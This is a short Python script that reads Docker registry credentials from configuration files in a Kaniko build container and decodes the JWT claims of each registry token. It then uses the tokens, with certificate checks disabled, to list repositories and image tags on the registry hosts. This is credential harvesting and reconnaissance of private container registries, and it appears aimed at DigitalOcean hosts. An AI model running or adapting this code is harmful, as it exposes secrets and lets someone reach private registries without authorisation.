import json,base64,urllib.request,ssl,time
ctx=ssl._create_unverified_context()
def get(url,headers,timeout=8):
    try:
        r=urllib.request.urlopen(urllib.request.Request(url,headers=headers),timeout=timeout,context=ctx)
        return r.status,r.read(6000),dict(r.headers)
    except Exception as e:
        code=getattr(e,'code',None)
        try: body=e.read(600)
        except Exception: body=b''
        return code or 'ERR', body, {}
seen=set()
for path in ('/kaniko/.docker/config.json','/etc/docker/config.json'):
    try: cfg=json.load(open(path))
    except Exception as e: continue
    for host,v in (cfg.get('auths') or {}).items():
        rt=v.get('registrytoken') or ''
        if not rt or rt in seen: continue
        seen.add(rt)
        print('HOSTLEN',len(host),'host_has_digitalocean','digitalocean' in host,'tokenlen',len(rt))
        try:
            p=rt.split('.')[1]; p+='='*(-len(p)%4); claims=json.loads(base64.urlsafe_b64decode(p))
            print(' CLAIMKEYS',list(claims.keys()))
            print(' ISS',claims.get('iss'),'AUD',claims.get('aud'),'IAT',claims.get('iat'),'EXP',claims.get('exp'),'NBF',claims.get('nbf'))
            acc=claims.get('access')
            print(' ACCESS',json.dumps(acc)[:1200] if acc is not None else None)
            sc=claims.get('scope') or claims.get('scopes')
            print(' SCOPE',json.dumps(sc)[:600] if sc is not None else None)
        except Exception as e: print(' CLAIMERR',repr(e)[:100])
        for proto in ('https',):
            base=f'{proto}://{host}'
            for pathq in ('/v2/','/v2/_catalog?n=100'):
                st,b,h=get(base+pathq,{'Authorization':'Bearer '+rt})
                print(' ',pathq,st,b[:200])
                if pathq.startswith('/v2/_catalog') and st==200:
                    try:
                        j=json.loads(b); repos=j.get('repositories') or []
                        print('   repo_count',len(repos),'name_lens',[len(x) for x in repos[:10]])
                        print('   prefixes',sorted(set(x.split('/')[0][:12] for x in repos))[:10])
                    except Exception as e: print('   parseerr',repr(e)[:80])
            # try tags for a plausible repo from access
            try:
                for a in (claims.get('access') or []):
                    nm=a.get('name')
                    if nm:
                        st,b,h=get(base+f'/v2/{nm}/tags/list',{'Authorization':'Bearer '+rt})
                        print('  tags',nm[:20]+'...',st,b[:160])
            except Exception: pass
print('DONE')
